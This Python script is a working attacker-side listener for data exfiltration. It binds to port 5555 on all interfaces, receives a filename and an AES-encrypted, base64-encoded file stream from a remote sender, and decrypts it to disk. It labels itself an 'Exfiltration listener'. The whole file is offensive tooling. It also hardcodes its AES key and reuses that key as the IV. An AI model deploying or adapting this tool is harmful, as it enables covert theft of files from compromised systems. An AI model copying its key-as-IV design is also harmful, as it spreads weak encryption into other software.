import socket
import base64
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = b'Sixteen byte key'
BLOCK_SIZE = 16
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 5555

def decrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    decoded = base64.b64decode(data)
    decrypted = unpad(cipher.decrypt(decoded), BLOCK_SIZE)
    return decrypted

def sanitize_filename(raw):
    decoded = raw.decode(errors='ignore')
    # Remove null bytes, control chars, and keep only safe characters
    cleaned = re.sub(r'[^\w\-_.]', '', decoded)
    return cleaned.strip() or "exfiltrated_file"

def receive_file(sock):
    raw_filename = sock.recv(1024)
    filename = sanitize_filename(raw_filename)
    print(f"[+] Receiving file: {filename}")

    with open(filename, "wb") as f:
        buffer = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            buffer += data
            while b"\n" in buffer:
                chunk, buffer = buffer.split(b"\n", 1)
                if chunk:
                    try:
                        decrypted_chunk = decrypt_data(chunk)
                        f.write(decrypted_chunk)
                    except Exception as e:
                        print(f"[!] Decryption error: {e}")

    print(f"[+] File {filename} saved.")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)
    print(f"[*] Exfiltration listener running on {LISTEN_IP}:{LISTEN_PORT}")

    client_socket, addr = server.accept()
    print(f"[*] Connection from {addr}")

    receive_file(client_socket)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()
